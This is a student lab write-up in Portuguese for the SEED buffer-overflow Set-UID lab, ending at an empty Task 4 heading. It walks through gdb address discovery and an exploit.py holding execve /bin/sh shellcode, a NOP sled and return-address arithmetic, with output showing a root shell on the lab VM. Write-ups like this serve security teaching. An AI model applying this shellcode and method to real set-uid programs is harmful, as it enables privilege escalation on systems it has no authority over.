# Buffer-Overflow Attack Lab - Set-UID Version

## Task 1

Começamos dentro da pasta **shellcode** e fazendo  **make** do ficheiro geramos dois executáveis **a32.out** e **a64.out**. Se executarmos tanto um como o outro leva a que uma shell seja aberta dentro do diretório onde é lançado cada programa.

```shell
[10/22/23]seed@VM:~/.../shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[10/22/23]seed@VM:~/.../shellcode$ ls
a32.out  a64.out  call_shellcode.c  Makefile
[10/22/23]seed@VM:~/.../shellcode$ ./a32.out
$ echo Im in
Im in
$
[10/22/23]seed@VM:~/.../shellcode$ ./a64.out
$ echo Im in
Im in
$
```

## Task 2

Inicialmente analisamos o código do programa, que contém uma vulnerabilidade de buffer-overflow, de modo a perceber a sua execução. Neste programa tenta-se copiar para um buffer de tamanho de 100 bytes um array de carateres que contém ate 517 bytes. Como o **strcpy()** não verifica os limites do buffer, acaba por ocorrer overflow.

## Task 3

De modo a explorar esta vulnerabilidade, temos de primeiro criar um ficheiro de texto vazio: **badfile**. De seguida executamos o código vulnerável em modo debug, com o objetivo de descobrir a posição do endereço de retorno da função **bof()** relativamente ao início do buffer. Para isso usamos o **gdb** para fazer debug e colocamos um breakpoint na função **bof()**.

```shell
[10/22/23]seed@VM:~/.../code$ touch badfile
[10/22/23]seed@VM:~/.../code$ gdb stack-L1-dbg
...
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
...
gdb-peda$ next
...       
gdb-peda$ p $ebp
$1 = (void *) 0xffffc948
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffc8dc
gdb-peda$ quit
```

Após obtermos os endereços necessários, temos de inserir no ficheiro **badfile** o conteúdo que pretendemos no buffer. Para isto usamos o programa **exploit.py** realizando as alterações necessárias de modo a conseguirmos explorar a vulnerabilidade.

Na variável **shellcode** inserimos o shellcode para criar uma shell de 32 bits:

```python
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"  
  "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
).encode('latin-1')
```

Cria-se um novo array de 517 bytes em que cada byte tem o valor 0x90 e coloca-se o shellcode no final do array:

```python
content = bytearray(0x90 for i in range(517))
start = 517 - len(shellcode)                
content[start:start + len(shellcode)] = shellcode
```

Por último, calculamos o novo endereço do shellcode a executar. Para isto utiliza-se os 2 endereços obtidos, calculando a localização do endereço de retorno relativamente ao início do array (offset) e colocou-se o novo endereço de retorno que aponta para o shellcode que se calculou anteriormente:

```python
ret    = 0xffffc948 + start           
offset = 0xffffc948 - 0xffffc8dc + 4
```

Executando o programa, é gerado o ficheiro **badfile**.

Finalmente, executa-se o programa com a vulnerabilidade de buffer-overflow e é criada uma shell com permissões root como esperado.

```shell
[10/22/23]seed@VM:~/.../code$ ./exploit.py
[10/22/23]seed@VM:~/.../code$ ls
badfile                        stack.c       stack-L3
brute-force.sh                 stack-L1      stack-L3-dbg
exploit.py                     stack-L1-dbg  stack-L4
Makefile                       stack-L2      stack-L4-dbg
peda-session-stack-L1-dbg.txt  stack-L2-dbg
[10/22/23]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# echo Im in                                                        
Im in
```

## Task 4














